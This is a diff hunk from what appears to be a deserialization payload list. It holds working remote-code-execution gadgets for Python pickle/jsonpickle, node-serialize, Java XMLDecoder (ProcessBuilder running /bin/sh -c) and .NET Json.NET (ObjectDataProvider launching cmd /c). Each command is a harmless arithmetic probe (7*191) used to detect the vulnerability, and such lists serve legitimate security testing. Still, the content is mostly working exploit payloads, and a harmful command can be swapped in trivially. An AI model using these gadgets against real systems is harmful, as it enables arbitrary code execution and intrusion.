@@ -21,3 +21,7 @@ Y19fYnVpbHRpbl9fCmV2YWwKKFMnNyoxOTEnCnRSLg==
 {"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["7*191"]}]}
 ##Node node-serialize - Math (return 7*191)##
 {"rce":"_$$ND_FUNC$$_function(){return 7*191}()"}
+##XMLDecoder - Math (expr 7*191)##
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/sh</string></void><void index="1"><string>-c</string></void><void index="2"><string>expr 7 \* 191</string></void></array><void method="start"/></object></java>
+##.NET Json.NET - Math (set /a 7*191)##
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c set /a 7*191"}}}
